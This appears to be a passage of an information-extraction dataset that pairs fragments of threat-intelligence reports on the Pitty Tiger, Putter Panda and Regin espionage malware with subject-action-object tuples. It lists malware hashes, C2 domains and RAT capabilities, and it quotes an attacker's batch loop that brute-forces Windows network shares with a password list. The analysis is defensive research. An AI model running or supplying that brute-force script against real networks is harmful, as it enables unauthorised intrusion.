Microsoft Office and corrected by Microsoft\u2019s\n    MS12-027 fix in April 2012": [{"exploiting": {"A": "exploiting", "S": "one such document used by that group of attacker", "O": ["CVE- 2012-0158, an old critical vulnerability impacting Microsoft Office and corrected by Microsoft\u2019s MS12-027 fix in April 2012"]}}], "\n</section>\n<section>\n    <heading>Installation</heading>\n\n    The malware<fn>1</fn>, when running in our sandbox, triggers the following alarms:\n\n<figure></figure>\n\n\n                           <caption>Alarms in our sandbox system, triggered by the PittyTiger malware</caption>\n\n\n\n    The binary drops two files in \u201cC:\\Windows\\System32\u201d:\n\n\n<footnote>\n    1\n        MD5 hash : be18418cafdb9f86303f7e419a389cc9\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 16/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n                                 <caption>Files dropped by the PittyTiger RAT in our sandbox</caption>\n\n    The \u201cqmgrxp.exe\u201d binary is a simple copy of the original binary": [{"is": {"A": "is", "S": "The \u201cqmgrxp.exe\u201d binary", "O": ["a simple copy of the original binary"]}}, {"drops": {"A": "drops", "S": "The binary", "O": ["two files", "in \u201cC:\\Windows\\System32\u201d"]}}], "\n\n    Pitty Tiger is effective and mature in the use of targeted malware, the use of known exploits to infect\n    computers with their malware and the creation of an infrastructure to efficiently conduct APT attacks": [{"infect": {"A": "infect", "S": "Pitty Tiger", "O": ["with their malware", "computers"]}}], " Every visitor of the compromised third party is then infected": [{"is then infected": {"A": "is then infected", "O": ["Every visitor of the compromised third party"]}}], "\n</section>\n<section>\n        <heading>Malware families</heading>\n\n    Six malware families have been identified as communicating with subdomains of skypetm.com.tw:\n<list>\n        -    MM RAT\n        -    Pitty Tiger RAT\n        -    Troj/ReRol.A\n        -    CT RAT\n        -    Paladin\n        -    Exadog\n</list>\n<table>\n                     MD5                                     Malware family                          C&C server\n    81fa811f56247c236566d430ae4798eb                            MM RAT                          ms11.skypetm.com.tw\n    55e456339936a56c73a7883ea1ddb672                     Backdoor:Win32/Ptiger.A               botemail.skypetm.com.tw\n    d5da60d678d5a55a847e1e6723c7a4d0                     Backdoor:Win32/Ptiger.A                 aniu.skypetm.com.tw\n    0750569cf1733d4fbb01169476387cc2                     Backdoor:Win32/Ptiger.A                 aniu.skypetm.com.tw\n                                                                                                zeng.skypetm.com.tw\n    abb0abfab252e4bfb9106273df3c1c2                      Backdoor:Win32/Ptiger.A                 aniu.skypetm.com.tw\n                                                                                                zeng.skypetm.com.tw\n    c0656b66b9f4180e59e1fd2f9f1a85f2                           Troj/Rerol.A                     zeng.skypetm.com.tw\n    ce15fa3338b7fe780e85c511d5e49a98                           Troj/Rerol.A                     zeng.skypetm.com.tw\n    8a54adb3976d1c03605656ca55be7400                     Backdoor:Win32/Ptiger.A                super.skypetm.com.tw\n    a1ea6dc12b983c7262fe76c1b3663b24                     Backdoor:Win32/Ptiger.A                qinoo.skypetm.com.tw\n    b6380439ff9ed0c6d45759da0f3b05b8                       Troj/Rerol.A dropper                sophos.skypetm.com.tw\n    5e2360a8c4a0cce1ae22919d8bff49fd                           Troj/ReRol.A                    sophos.skypetm.com.tw\n    79e48961d1ee982a466d222671a42ccb                           Troj/ReRol.A                    sophos.skypetm.com.tw\n    4ab74387f7a02c115deea2110f961fd3                             ReRol.A                       sophos.skypetm.com.tw\n    bf95e89906b8a17fd611002660ffff32                           Troj/ReRol.A                    sophos.skypetm.com.tw\n    CONTAINS VICTIM INFORMATION                     Office Word file - Rerol.A dropper         sophos.skypetm.com.tw\n    4ce8593c9de2b27b5c389f651c81638b                             CT RAT                        newb02.skypetm.com.tw\n    8df89df484ca5c376b763479ea08d036                             Paladin                       newb02.skypetm.com.tw\n    22e47c5e3809a4150d0db7fc99a68cc0                    Office Excel file \u2013 Rerol.A             margo.skypetm.com.tw\n                                                                 dropper\n    dd87c68c1e71bb104a48a6be87a2349f                     Backdoor:Win32/Ptiger.A                ripper.skypetm.com.tw\n    068870c2c165a1d29fc2f3d3edfed3ae                        Win32/Exadog.AA                       link.skypetm.com.tw\n    Unknown                                              Backdoor:Win32/Ptiger.A                 asdf.skypetm.com.tw\n</table>\n\n   <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 33/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<figure></figure>\n\n\n                                   <caption>Skypetm.com.tw infrastructure: subdomains and malware linked to it</caption>\n\n<table>\n\n    Hosting Company       Geolocalisation        IP Range            IP Address          C&C server                Timeline\n\n\n    Take 2 Hosting Inc": [{"communicating": {"A": "communicating", "S": "Six malware families", "O": ["with subdomains of skypetm.com.tw"]}}], " To build a watering hole attack, attackers do compromise the website of a third party,\n    generally a supplier of the target, which is typically visited by a specific group of professionals and\n    very likely by the target": [{"compromise": {"A": "compromise", "S": "attackers", "O": ["To build a watering hole attack", "the website of a third party, generally a supplier of the target, which is typically visited by a specific group of professionals and very likely by the target"]}}], "\n\n    He launched some tests with the CT RAT we exposed earlier:\n\n\n<figure></figure>\n\n                          <caption>User \u201cToot\u201d logging on the CT RAT on machine \u201ctoot-2a601225a8\u201d, 2014/02/10</caption>\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 44/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<figure></figure>\n\n\n                          <caption>User \u201cToot\u201d logging on the CT RAT on machine \u201ctoot-2a601225a8\u201d, 2014/04/09</caption>\n\n<figure></figure>\n\n\n\n                          <caption>User \u201cToot\u201d logging on the CT RAT on machine \u201ctoot-2a601225a8\u201d, 2014/04/09</caption>\n\n\n\n    Here we can see a user \u201cToot\u201d from a machine named \u201ctoot-2a601225a8\u201d logging in the CT RAT\n    and executing some commands": [{"executing": {"A": "executing", "S": "a user \u201cToot\u201d", "O": ["some commands"]}}], "\n\n    We discovered this malware sample in June 2014, leading to a command & control (c&c) server still\n    in activity": [{"leading": {"A": "leading", "S": "this malware sample", "O": ["to a command & control (c&c) server still in activity"]}}], "\n\n    After these tests, we could see some real connections to a victim using this RAT": [{"using": {"A": "using", "S": "some real connections to a victim", "O": ["this RAT"]}}], " We suspect Pitty Tiger to use this compromise to spear\n    phish other companies which are in commercial relation with this web development company": [{"spear phish": {"A": "spear phish", "S": "Pitty Tiger", "O": ["other companies which are in commercial relation with this web development company"]}}], " A script named ipc.bat uses a file\n    named user.txt to try to brute-force a shared folder access:\n<code>\n                     for /f \"tokens=1,2 delims= \" %%i in (user.txt) do (net use \\\\<TARGETEDIP>\\ipc$ \"%%j\" /u:%%i)\n                     && (net use \\\\<TARGETEDIP> /del) && (echo user:%%i pass:%%j>>succ.txt)\n</code>\n                            <caption>One script used to brute-force a network share inside a company\u2019s network</caption>\n\n    The user.txt file contains thousands of lines, each one being a couple of one particular username\n    and one password attempt:\n<list>\n                     administrator nameofonetargetedcompany\n                     administrator !Password\n                     administrator azerty123\n                     \u2026\n                     administrateurnameofonetargetedcompany\n                     administrateur !Password\n                     administrateur azerty123\n                     \u2026\n                     <username>nameofonetargetedcompany\n                     <username> !Password\n                     <username> azerty123\n                     \u2026\n                     <anotheruser>nameofonetargetedcompany\n                     <anotheruser> !Password\n                     <anotheruser> azerty123\n                     \u2026\n                                Anonymized dictionary file used for brute-forcing a network share\n</list>\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 51/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n    This user.txt file has been anonymized, yet we wanted to give you the feel for it": [{"brute-force": {"A": "brute-force", "S": "a file named user.txt", "O": ["a shared folder access"]}}], "\n</section>\n<section>\n    <heading>Installation</heading>\n\n    The binary we found was dropped by a malicious Word document": [{"was dropped": {"A": "was dropped", "S": "a malicious Word document", "O": ["The binary we found"]}}], "\n\n\n<figure></figure>\n\n                                   <caption>IP address used by TIEWEISHIPC computer</caption>\n\n    Some connections to the c&c originated from a computer named FLY-THINK with several IP\n    addresses, all located in Fuqing (Fujian province)": [{"originated": {"A": "originated", "S": "Some connections to the c&c", "O": ["from a computer named FLY-THINK with several IP addresses, all located in Fuqing (Fujian province)"]}}], "\n</section>\n<section>\n    <heading>Command & Control</heading>\n\n    The data sent in the POST request has a 0x11 bytes header consisting of a fixed-value byte (0xc3)\n    followed by a 0x10 bytes encryption key": [{"sent": {"A": "sent", "O": ["in the POST request", "The data"]}}], " It can also download and execute binaries": [{"execute": {"A": "execute", "S": "It"}, "download": {"A": "download", "S": "It"}}], " When executed, a mutex called \u201cPittyTiger\u201d is created": [{"is created": {"A": "is created", "O": ["a mutex called \u201cPittyTiger\u201d"]}}], " We\n    also found one RTF document embedding CVE-2014-1761, which is a more recent exploit": [{"embedding": {"A": "embedding", "S": "one RTF document", "O": ["CVE-2014-1761"]}}], "\n\n    The following features are implemented:\n<list>\n       - c&c authentication using password\n       - Remote shell\n       - Remote commands\n       - File Download / Upload / Deletion / Search\n       - Bot termination\n</list>\n    The following CGI files can be requested by the bot:\n<list>\n       - Vip: test for connectivity\n       - Owpp4: register new bot\n       - CReply: answer to remote commands\n       - Clrf: clear remote file (to clear ComMand.sec after reading)\n       - CFile: transmit file (file transfers or answers to commands)\n       - Cerr: send error\n</list>\n    The configuration is stored locally in a file called \u201cschmup.sys\u201d": [{"be requested": {"A": "be requested", "S": "the bot", "O": ["The following CGI files"]}}], "\n</section>\n<section>\n\n            <heading>PALADIN RAT</heading>\n\n    This is another remote administration tool used by the Pitty Tiger group": [{"used": {"A": "used", "S": "the Pitty Tiger group", "O": ["another remote administration tool"]}}], " Several threads are used to handle different stages of the\n C2 protocol, such as receiving data from the server, decrypting data, and processing\n commands": [{"receiving": {"A": "receiving", "O": ["from the server", "data"]}}, {"processing": {"A": "processing", "O": ["commands"]}}, {"decrypting": {"A": "decrypting", "O": ["data"]}}], " The initial beacon uses a request with four parameters\n(h1, h2, h3, and h4) \u2013 as shown in Figure 8 \u2013 to register the implant with the C2 server": [{"uses": {"A": "uses", "S": "The initial beacon", "O": ["to register the implant with the C2 server", "a request with four parameters (h1, h2, h3, and h4)"]}}], "\nThe operation of this RAT is described in detail in other CrowdStrike reporting, but is useful to revisit here to\nhighlight the characteristics of the RAT:                                              \n\n\n\u2022 C2 occurs over HTTP, after connectivity has been verified by making a distinctive request (to the URI /\nsearch?qu= at www.google.com)": [{"occurs": {"A": "occurs", "S": "C2", "O": ["over HTTP", "after connectivity has been verified by making a distinctive request (to the URI / search?qu= at www.google.com)"]}}], "\n The dropped executable (MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d) primarily aims to inject\n the specified DLL (McUpdate.dll, MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f) into a process that\n would normally be accessing the network, likely in order to disguise the malicious activity": [{"disguise": {"A": "disguise", "S": "The dropped executable (MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d)", "O": ["the malicious activity"]}, "inject": {"A": "inject", "S": "The dropped executable (MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d)", "O": ["the specified DLL (McUpdate.dll, MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f)", "into a process that would normally be accessing the network"]}}], " The malware will then attempt to download content from the specified URL to the filename within\nthe user\u2019s temporary directory, and then execute this file via the WinExec API": [{"execute": {"A": "execute", "S": "The malware", "O": ["via the WinExec API", "this file"]}, "download": {"A": "download", "S": "The malware", "O": ["to the filename within the user\u2019s temporary directory", "from the specified URL", "content"]}}], " If this execution attempt\nsucceeds, a final C2 request will be made \u2013 in this case to a URL using the same path as the initial request (and\na similarly random parameter), but with a filename of success.asp": [{"be made": {"A": "be made", "O": ["to a URL using the same path as the initial request (and a similarly random parameter)", "a final C2 request"]}}], "\n</section>\n<footer>\n\n\n\n\n                                                                                                                  33\n</footer>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n<section>\n <heading>HTTPCLIENT \u2013 EXAMPLE MD5 HASH\n 544FCA6EB8181F163E2768C81F2BA0B3</heading>\n Like pngdowner, the httpclient malware is a simple tool that provides a limited range of functionality and uses\n HTTP for its C2 channel": [{"uses": {"A": "uses", "S": "the httpclient malware", "O": ["HTTP", "for its C2 channel"]}}], " Otherwise, a shell process is started (i.e., cmd.exe), with input/output redirected over the C2\n channel": [{"is started": {"A": "is started", "O": ["a shell process", "with input/output redirected over the C2 channel"]}}], "\n Another dropper has been observed, exclusively installing the pngdowner malware (example MD5 hash\n 4c50457c35e2033b3a03fcbb4adac7b7)": [{"installing": {"A": "installing", "S": "Another dropper", "O": ["the pngdowner malware (example MD5 hash 4c50457c35e2033b3a03fcbb4adac7b7)"]}}], "                                                                          \n Both the document and executable are written to disk and the executed via the ShellExecute             API (using the\n verb \u201copen\u201d)": [{"are written": {"A": "are written", "O": ["to disk", "Both the document and executable"]}, "executed": {"A": "executed", "O": ["via the ShellExecute             API (using the verb \u201copen\u201d)", "Both the document and executable"]}}], "\n\n\nThis toolset provides a wide degree of control over a victim system and can provide the\nopportunity to deploy additional tools at will": [{"deploy": {"A": "deploy", "S": "This toolset", "O": ["additional tools", "at will"]}, "provides": {"A": "provides", "S": "This toolset", "O": ["a wide degree of control over a victim system"]}}], " An initial request is then made to the hard-coded C2 server and initial URI \u2013 forming a URL of the form\n(in this sample) http://login.stream-media.net/files/xx11/index.asp?95027775, where the numerical parameter\nrepresents a random integer": [{"is then made": {"A": "is then made", "O": ["An initial request", "to the hard-coded C2 server and initial URI"]}}], " The executable and DLL are both\n contained within the .data section of the dropper, obfuscated with a 16-byte XOR key (consisting of the bytes\n 0xA0 \u2013 0xAF)": [{"obfuscated": {"A": "obfuscated", "O": ["with a 16-byte XOR key (consisting of the bytes 0xA0 \u2013 0xAF)", "The executable and DLL"]}}], "\n</footnote>\n<footer>\n\n\n\n                                                                                                                                     30\n</footer>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n\n\n<figure></figure>\n\nIf this request is also successful, the RAT will attempt to retrieve tasking from the\ncontroller using a further distinctive HTTP request shown in Figure 13, repeating this\n                                                                                  \nrequest every two seconds until valid tasking is returned": [{"retrieve": {"A": "retrieve", "S": "the RAT", "O": ["using a further distinctive HTTP request shown in Figure 13", "from the controller", "tasking"]}}], " The report illuminates a wide set of tools in use by the actors,\nincluding several Remote Access Tools (RATs)": [{"use": {"A": "use", "S": "the actors", "O": ["including several Remote Access Tools (RATs)", "a wide set of tools"]}}], " The RAT will then use a byte-wise subtraction-\nbased algorithm (using a hard-coded modulo value) to decode C2 server details\nconsisting of a server hostname and port number, in this example nsc.adomhn": [{"use": {"A": "use", "S": "The RAT", "O": ["a byte-wise subtraction- based algorithm (using a hard-coded modulo value)", "to decode C2 server details consisting of a server hostname and port number, in this example nsc.adomhn. com, port 80"]}}], "\n\n\nInitially, the malware will perform a connectivity check to a hard-coded URL (http://www.microsoft.com),\nusing a constant user agent Mozilla/4.0 (Compatible; MSIE 6.0;)": [{"perform": {"A": "perform", "S": "the malware", "O": ["to a hard-coded URL (http://www.microsoft.com)", "using a constant user agent Mozilla/4.0 (Compatible; MSIE 6.0;)", "a connectivity check"]}}], "\n\n\nOn startup, the RAT attempts to create a file mapping named\n&*SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf": [{"create": {"A": "create", "S": "the RAT", "O": ["a file mapping named &*SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf"]}}], "\n\n\n The malware will then connect to its configured C2 infrastructure (file.anyoffice.info) and perform a HTTP\n request of the form shown in Figure 14 below:\n\n\n\n<figure></figure>\n<caption>Figure 14": [{"connect": {"A": "connect", "S": "The malware", "O": ["to its configured C2 infrastructure (file.anyoffice.info)"]}, "perform": {"A": "perform", "S": "The malware", "O": ["a HTTP request of the form shown in Figure 14 below"]}}], " An initial request is made to the C2 server (illustrated\n in Figure 11 above), but the response value is effectively ignored; it is likely that this\n request serves only as a connectivity check, as further C2 activity will only occur\n if this first request is successful": [{"is made": {"A": "is made", "O": ["An initial request", "to the C2 server"]}}, {"serves": {"A": "serves", "S": "this request", "O": ["as a connectivity check"]}}], " If the session is ended, two other commands are supported: m2b (upload file) and\n b2m (download file)": [{"download": {"A": "download", "O": ["file"]}}, {"upload": {"A": "upload", "O": ["file"]}}, {"are supported": {"A": "are supported", "O": ["two other commands"]}}], " The executable is also installed into the ASEP registry key HKCU\\Software\\Microsoft\\Windows\\\n CurrentVersion\\Run, with a value named McUpdate": [{"is also installed": {"A": "is also installed", "O": ["with a value named McUpdate", "into the ASEP registry key HKCU\\Software\\Microsoft\\Windows\\ CurrentVersion\\Run", "The executable"]}}], " If this request fails, the malware will attempt to\nextract proxy details and credentials from Windows Protected Storage, and from the IE Credentials Store using\npublicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HTTP\naccess": [{"extract": {"A": "extract", "S": "the malware", "O": ["from the IE Credentials Store", "from Windows Protected Storage", "using publicly known methods15", "proxy details and credentials"]}}], " Output data produced by tasking instructions is encrypted in the same manner as it\nwas decrypted and sent back to the C2 server via HTTP POST request to a URI of the form /microsoft/errorpost/\ndefault.aspx?ID=, where the ID value is a random number in decimal representation \u2013 as with the initial request\nshown in Figure 4": [{"is encrypted": {"A": "is encrypted", "O": ["in the same manner as it was decrypted", "Output data produced by tasking instructions"]}, "sent": {"A": "sent", "O": ["via HTTP POST request to a URI of the form /microsoft/errorpost/ default.aspx?ID=", "Output data produced by tasking instructions", "back to the C2 server"]}}], "\n\u2022 A victim identifier is generated from the infected machine\u2019s hard disk serial number, XOR\u2019ed with the key\nldd46!yo , and finally nibble-wise encoded as upper-case ASCII characters in the range (A-P) \u2013 e.g., the\nbyte value 0x1F becomes \u201cBP\u201d": [{"is generated": {"A": "is generated", "O": ["A victim identifier", "from the infected machine\u2019s hard disk serial number"]}}], " It is likely that this request functions as a means to authenticate\n the RAT to the C2 server and register a new victim machine with the controller": [{"register": {"A": "register", "S": "this request", "O": ["a new victim machine", "with the controller"]}}], " This malware also initially performs a connectivity check to www.microsoft.com using\n the hard-coded user agent Mozilla/4.0 (Compatible; MSIE 6.0;), although in this variant no attempt is made to\n extract proxy credentials": [{"performs": {"A": "performs", "S": "This malware", "O": ["a connectivity check", "using the hard-coded user agent Mozilla/4.0 (Compatible; MSIE 6.0;)", "to www.microsoft.com"]}}], " This\n dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the\n payload to disk and executing it": [{"executing": {"A": "executing", "S": "This dropper", "O": ["it"]}, "writing": {"A": "writing", "S": "This dropper", "O": ["the payload", "to disk"]}}], "\n\n\nThe set of commands supported by the RAT is somewhat limited, indicating that perhaps the RAT is intended\nto be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a\ncompromised system (which is consistent with its support for sleeping until a certain date/time)": [{"sleeping": {"A": "sleeping", "S": "the RAT", "O": ["until a certain date/time"]}, "supported": {"A": "supported", "S": "the RAT", "O": ["The set of commands"]}}], " The RATs are used by the PUTTER PANDA actors to\nconduct intelligence-gathering operations with a significant focus on the space technology sector": [{"conduct": {"A": "conduct", "S": "the PUTTER PANDA actors", "O": ["intelligence-gathering operations"]}, "are used": {"A": "are used", "S": "the PUTTER PANDA actors", "O": ["The RATs"]}}], " 3PARA\n RAT Initial Beacon</caption>\n\n\n\n\n As with the 4H RAT, the C2 protocol used by the 3PARA RAT is HTTP based, using\n both GET and POST requests": [{"using": {"A": "using", "S": "the C2 protocol", "O": ["GET"]}, "is": {"A": "is", "S": "the C2 protocol", "O": ["HTTP based"]}}, {"used": {"A": "used", "S": "the 3PARA RAT", "O": ["the C2 protocol"]}}], " In this case, the RAT will transmit some basic victim\n information to the C2 server along with a 256-byte hash of the hard-coded string\n HYF54&%9&jkMCXuiS": [{"transmit": {"A": "transmit", "S": "the RAT", "O": ["some basic victim information to the C2 server", "along with a 256-byte hash of the hard-coded string HYF54&%9&jkMCXuiS"]}}], " If this string is not present, the C2 request is repeated\n every 0.5 seconds": [{"is repeated": {"A": "is repeated", "O": ["every 0.5 seconds", "the C2 request"]}}], "\n\u2022 The commands supported by the RAT enable several capabilities, including:\n<list>\n   o Remote shell\n   o\n   \u0007 Listing of running processes (including loaded modules)\n   o Process termination (specified by PID)\n   o File and directory listing\n   o File upload, download, deletion, and timestamp modification\n</list>\n<footer>\n\n\n\n\n                                                                                                                    27\n</footer>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n\n\n<figure></figure>\n<caption>\nFigure 8": [{"supported": {"A": "supported", "S": "the RAT", "O": ["The commands"]}}], "\n</section>\n<footer>\n\n\n                                              7\n</footer>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team</header>\n\n<section>\n                                        <heading>C2 Indicators</heading>\n                                        Although some of the domains used\n                                        for command and control of the tools\n                                        described later in this report appear\n                                        to be legitimate sites that have been\n                                        compromised in some way, many of\n                                        them appear to have been originally\n                                        registered by the operators": [{"used": {"A": "used", "O": ["some of the domains", "for command and control of the tools described later in this report"]}}], " These are shown\nin Table 3, and may be used for command and control of PUTTER PANDA tools": [{"be used": {"A": "be used", "O": ["These", "for command and control of PUTTER PANDA tools"]}}], "\n\n</section>\n<section> \n <heading>DROPPERS \u2013 RC4 AND XOR BASED</heading>\n Other CrowdStrike reporting describes a dropper used by PUTTER PANDA (abc.scr) to install the 4H RAT": [{"install": {"A": "install", "S": "a dropper", "O": ["the 4H RAT"]}}, {"used": {"A": "used", "S": "PUTTER PANDA", "O": ["a dropper"]}}], " If Internet Explorer is used, then the malware will attempt to terminate processes\n corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe)": [{"terminate": {"A": "terminate", "S": "the malware", "O": ["processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe)"]}}], "\n</section>\n<footer>\n\n\n\n                                                                25\n</footer>\n\f\n<cover>\n<heading>Technical Analysis</heading>\n</cover>\n<header>\fCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n<section>\n<heading>\nTechnical Analysis</heading>\nSeveral RATs are used by PUTTER PANDA": [{"are used": {"A": "are used", "S": "PUTTER PANDA", "O": ["Several RATs"]}}], "\n\n\n Once running, the RAT will load a binary representation of a date/time value<fn>13</fn> from a\n file C:\\RECYCLER\\restore.dat, and it will sleep until after this date/time has passed": [{"load": {"A": "load", "S": "the RAT", "O": ["from a file C:\\RECYCLER\\restore.dat", "a binary representation of a date/time value"]}}, {"sleep": {"A": "sleep", "S": "it", "O": ["until after this date/time has passed"]}}], " Database\n provides a mechanism for the operators to allow the RAT to remain dormant until a\n fixed time, perhaps to allow a means of regaining access if other parts of their toolset\n are removed from a victim system": [{"remain": {"A": "remain", "S": "the RAT", "O": ["until a fixed time", "dormant"]}}], " Finally, the malware will delete the content saved from the first\nrequest, and exit": [{"delete": {"A": "delete", "S": "the malware", "O": ["the content saved from the first request"]}}], " Although some of their tools are\nsimplistic, taken as a whole their toolset provides a wide degree of control\nover a victim system and can provide the opportunity to deploy additional\ntools at will": [{"provides": {"A": "provides", "S": "their toolset", "O": ["a wide degree of control over a victim system"]}, "deploy": {"A": "deploy", "S": "their toolset", "O": ["additional tools", "at will"]}}], " Two droppers have been associated with the\nPUTTER PANDA toolset; these are also briefly examined below": [{"been associated": {"A": "been associated", "O": ["with the PUTTER PANDA toolset", "Two droppers"]}}], "\n Four examples of these droppers were located, using a mixture of decoy PDF and Microsoft Word documents\n (shown below in Figures 15-18)": [{"using": {"A": "using", "S": "these droppers", "O": ["a mixture of decoy PDF and Microsoft Word documents"]}}], "\n\u2022 Communication to and from the C2 server is obfuscated using a 1-byte XOR with the key 0xBE": [{"is obfuscated": {"A": "is obfuscated", "O": ["Communication to and from the C2 server", "using a 1-byte XOR with the key 0xBE"]}}], "\n\n\nThe limited functionality, and lack of persistence of this tool, implies that it is used only as a simple download-\nand-execute utility": [{"is used": {"A": "is used", "O": ["as a simple download- and-execute utility", "it"]}}], "\n\n\u2794 \u0007They focus their exploits against\n popular productivity applications\n such as Adobe Reader and Microsoft\n    Office to deploy custom malware\n through targeted email attacks": [{"deploy": {"A": "deploy", "S": "\u0007They", "O": ["through targeted email attacks", "custom malware"]}}], " This is used to prevent multiple instances of\nthe RAT being executed simultaneously": [{"is used": {"A": "is used", "O": ["This", "to prevent multiple instances of the RAT being executed simultaneously"]}}], " Finally, the dropper deletes itself via a batch file": [{"deletes": {"A": "deletes", "S": "the dropper", "O": ["via a batch file", "itself"]}}], " They focus their exploits against popular productivity\napplications such as Adobe Reader and Microsoft Office to deploy custom malware through\ntargeted email attacks": [{"deploy": {"A": "deploy", "S": "They", "O": ["custom malware", "through targeted email attacks"]}}], "\n\u2022 A series of HTTP requests characterizes the RAT\u2019s C2": [{"characterizes": {"A": "characterizes", "S": "A series of HTTP requests", "O": ["the RAT\u2019s C2"]}}], " Targets may be tricked into\n    visiting spoofed versions of well-\n    known websites and the threat may\n    be installed through a web browser\n    or by exploiting an application": [{"be installed": {"A": "be installed", "O": ["through a web browser", "the threat", "by exploiting an application"]}}], " For example, one module was designed to\n    monitor network traffic to Microsoft Internet Information Services (IIS) web servers, another was designed\n    to collect administration traffic for mobile telephony base station controllers, while another was created\n    specifically for parsing mail from Exchange databases": [{"monitor": {"A": "monitor", "S": "one module", "O": ["network traffic to Microsoft Internet Information Services (IIS) web servers"]}}, {"parsing": {"A": "parsing", "S": "another", "O": ["mail from Exchange databases"]}}, {"collect": {"A": "collect", "S": "another", "O": ["administration traffic for mobile telephony base station controllers"]}}], " The threat\u2019s standard capabilities include several remote access Trojan (RAT) features, such as\n    capturing screenshots and taking control of the mouse\u2019s point-and-click functions": [{"capturing": {"A": "capturing", "O": ["screenshots"]}}, {"include": {"A": "include", "S": "The threat\u2019s standard capabilities", "O": ["several remote access Trojan (RAT) features"]}}, {"taking": {"A": "taking", "O": ["control of the mouse\u2019s point-and-click functions"]}}], " On\n    one computer, log files show that\n    Regin originated from Yahoo! Instant\n    Messenger through an unconfirmed\n    exploit": [{"originated": {"A": "originated", "S": "Regin", "O": ["from Yahoo! Instant Messenger", "through an unconfirmed exploit"]}}], " All\n\n  communications are strongly encrypted and\n  can happen in a two-stage fashion where the\n  attacker may contact a compromised computer\n  using one channel to instruct it to begin\n  communications on a different channel": [{"happen": {"A": "happen", "S": "All communications", "O": ["in a two-stage fashion"]}}, {"instruct": {"A": "instruct", "S": "the attacker", "O": ["it"]}, "contact": {"A": "contact", "S": "the attacker", "O": ["using one channel", "a compromised computer"]}}, {"begin": {"A": "begin", "S": "it", "O": ["communications", "on a different channel"]}}, {"are strongly encrypted": {"A": "are strongly encrypted", "O": ["All communications"]}}], "\n<list>\n  \u2022\t UDP: Raw UDP payload\n  \u2022\t TCP: Raw TCP payload\n</list>\n  \u2022\t HTTP: Payload information can be encoded and embedded within cookie data under the names SESSID,\n     SMSWAP, TW, WINKER, TIMESET, LASTVISIT, AST.NET_SessionId, PHPSESSID, or phpAds_d": [{"be encoded and embedded": {"A": "be encoded and embedded", "O": ["Payload information", "within cookie data"]}}], "\n                           \u2022\t   Partial: Log type, last log, older log timestamps\n                           \u2022\t   Complete: Entire log data is exfiltrated\n\n</table>\n    The IIS web server log stealing module, 27E9h, is an example of a payload module that was installed after the initial\n    infection and was specifically deployed for a particular target": [{"stealing": {"A": "stealing", "S": "module", "O": ["The IIS web server log"]}}, {"was installed": {"A": "was installed", "O": ["a payload module"]}}, {}], " Rather than loading Stage 2 from an NTFS extended attribute, Stage 1 looks for the last partition (in terms of\n\n\n\n\n                                              <footer>         Page 15</footer>\n\f                                           <header>    Regin: Top-tier espionage tool enables stealthy surveillance</header>\n\n\n\n\n    physical location) on disk and searches for the payload in the raw sectors in this area of the disk": [{"looks": {"A": "looks", "S": "Stage 1", "O": ["for the last partition (in terms of physical location) on disk"]}, "searches": {"A": "searches", "S": "Stage 1", "O": ["for the payload", "in the raw sectors in this area of the disk"]}}], " Instead, Stage 1 is a user mode DLL loaded as a Winsock helper when the computer is starting\n    up": [{"loaded": {"A": "loaded", "S": "Stage 1", "O": ["as a Winsock helper", "when the computer is starting up"]}}], " Instead, this file is encrypted within\n  an extended attribute or registry key blob": [{"is encrypted": {"A": "is encrypted", "O": ["within an extended attribute or registry key blob", "this file"]}}], "\n\n  The main purpose of Regin is intelligence gathering and it has been implicated in data\n  collection operations against government organizations, infrastructure operators,\n  businesses, academics, and private individuals": [{"implicated": {"A": "implicated", "S": "it", "O": ["in data collection operations against government organizations, infrastructure operators, businesses, academics, and private individuals"]}}, {"is": {"A": "is", "S": "The main purpose of Regin", "O": ["intelligence gathering"]}}], " Furthermore, compromised\n  computers can serve as a proxy for other\n  infections and command and control can\n  also happen in a peer-to-peer fashion": [{"serve": {"A": "serve", "S": "compromised computers", "O": ["as a proxy for other infections"]}}, {"happen": {"A": "happen", "S": "command and control", "O": ["in a peer-to-peer fashion"]}}], " This stage drops the file msrdc64.dat, which appears to always\n  be 512 bytes in size": [{"drops": {"A": "drops", "S": "This stage", "O": ["the file msrdc64.dat"]}}], "\n\n  Stage 2 can be found encrypted in:\n<list>\n  Extended attribute\n  \u2022\t %Windir%\n  \u2022\t %Windir%\\fonts\n  